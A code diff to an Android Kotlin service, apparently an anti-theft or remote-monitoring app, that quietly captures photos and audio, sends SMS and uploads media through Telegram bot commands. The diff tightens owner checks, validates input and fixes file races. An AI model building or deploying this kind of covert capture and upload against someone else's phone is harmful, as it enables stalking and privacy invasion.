@@ -53,6 +53,8 @@ class MonitoringService : Service() {
     private val photoFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
     @Volatile
     private var activeAudioFile: File? = null
+    @Volatile
+    private var activePhotoFile: File? = null
     private var ringJob: Job? = null
     private var recordJob: Job? = null
     private var smsJob: Job? = null
@@ -192,7 +194,7 @@ class MonitoringService : Service() {
             }
         } catch (_: Exception) {
         }
-        if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true) {
+        if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && loopWatchdogJob?.isActive == true && speedJob?.isActive == true) {
             refreshCreds()
             return
         }
@@ -547,13 +549,11 @@ class MonitoringService : Service() {
                 } else {
                     val message = update.message ?: update.editedMessage
                     val senderOk = message?.from?.id?.toString() == chatId
-                    val chatOk = message != null && message.chat.id.toString() == chatId
-                    val ownerOk = senderOk || chatOk
                     val full = (message?.text ?: message?.caption)?.trim()
-                    if (ownerOk && full != null) {
+                    if (senderOk && full != null) {
                         val head = full.substringBefore(" ")
                         val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
-                        if (command.startsWith("/") && (senderOk || command !in setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue"))) {
+                        if (command.startsWith("/")) {
                             val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                             val input = if (arg.isEmpty()) command else "$command $arg"
                             handleTelegramCommand(input, message?.date ?: 0)
@@ -972,8 +972,10 @@ class MonitoringService : Service() {
                 }
             }
             "/ring" -> {
-                val seconds = arg.toIntOrNull()?.coerceIn(5, 60) ?: 15
-                if (!ringBusy.compareAndSet(false, true)) {
+                val seconds = if (arg.isEmpty()) 15 else arg.toIntOrNull()?.coerceIn(5, 60)
+                if (seconds == null) {
+                    sendToTelegram("Usage: /ring [5-60] (seconds)")
+                } else if (!ringBusy.compareAndSet(false, true)) {
                     sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
                 } else {
                     ringJob = serviceScope.launch {
@@ -1388,6 +1390,7 @@ class MonitoringService : Service() {
                         .setOngoing(true)
                         .setSilent(true)
                         .setShowWhen(false)
+                        .setOnlyAlertOnce(true)
                         .build()
                     val manager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
                     manager.notify(NOTIFICATION_ID, notification)
@@ -1584,8 +1587,10 @@ class MonitoringService : Service() {
         val digits = raw.filter { it.isDigit() }
         if (digits.isEmpty()) return false
         val local = if (digits.startsWith("0")) digits.substring(1) else digits
-        if (digits.length in 3..6 && local.startsWith("9")) return true
-        return listOf("1900", "900", "976").any { digits.startsWith(it) || local.startsWith(it) }
+        if (local.length <= 6) {
+            return local.startsWith("9") || local == "900" || local == "976"
+        }
+        return local.startsWith("1900")
     }
 
     private suspend fun sendSmsPending(number: String, smsText: String) {
@@ -2123,21 +2128,26 @@ class MonitoringService : Service() {
                         wd.cancel()
                     } catch (_: Exception) {
                     }
+                    activePhotoFile = photoFile
                     serviceScope.launch {
-                        when (sendPhotoFile(photoFile)) {
-                            MediaSendOutcome.SENT -> flushPendingPhotos()
-                            MediaSendOutcome.DROPPED -> {
-                                prunePhotoCache()
-                                if (reportResult) {
-                                    sendToTelegram("⚠️ Photo rejected by Telegram (400), file discarded.")
+                        try {
+                            when (sendPhotoFile(photoFile)) {
+                                MediaSendOutcome.SENT -> flushPendingPhotos()
+                                MediaSendOutcome.DROPPED -> {
+                                    prunePhotoCache()
+                                    if (reportResult) {
+                                        sendToTelegram("⚠️ Photo rejected by Telegram (400), file discarded.")
+                                    }
+                                }
+                                MediaSendOutcome.KEPT -> {
+                                    prunePhotoCache()
+                                    if (reportResult) {
+                                        sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
+                                    }
                                 }
                             }
-                            MediaSendOutcome.KEPT -> {
-                                prunePhotoCache()
-                                if (reportResult) {
-                                    sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
-                                }
-                            }
+                        } finally {
+                            activePhotoFile = null
                         }
                     }
                 },
@@ -2569,7 +2579,7 @@ class MonitoringService : Service() {
         try {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-            }?.sortedBy { it.lastModified() } ?: return
+            }?.sortedBy { it.lastModified() }?.filter { it != activeAudioFile } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
@@ -2750,7 +2760,10 @@ class MonitoringService : Service() {
             } catch (e: Exception) {
                 return
             }
+            val now = System.currentTimeMillis()
             for (file in pending) {
+                if (file == activePhotoFile) continue
+                if (now - file.lastModified() < 10_000L) continue
                 if (sendPhotoFile(file) == MediaSendOutcome.KEPT) break
                 kotlinx.coroutines.delay(500)
             }
@@ -2770,7 +2783,7 @@ class MonitoringService : Service() {
         try {
             val photos = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
-            }?.sortedBy { it.lastModified() } ?: return
+            }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile } ?: return
             val dropped = photos.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
